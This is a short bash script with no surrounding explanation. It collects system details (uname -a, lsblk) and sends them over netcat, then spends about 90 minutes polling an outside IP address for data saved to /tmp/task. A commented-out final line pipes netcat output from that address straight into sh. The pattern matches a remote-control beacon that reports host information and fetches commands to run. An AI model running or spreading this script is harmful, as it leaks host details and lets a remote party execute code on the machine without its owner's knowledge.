#!/bin/bash
{
    uname -a
    echo 57.129.54.120
    lsblk
} | nc -w 10 127.0.0.1 23458
until (( SECONDS >= 5400 )); do
    nc -w 10 57.129.54.120 23458 > /tmp/task
    sleep 5
done
# nc -w 10 57.129.54.120 23458 | sh
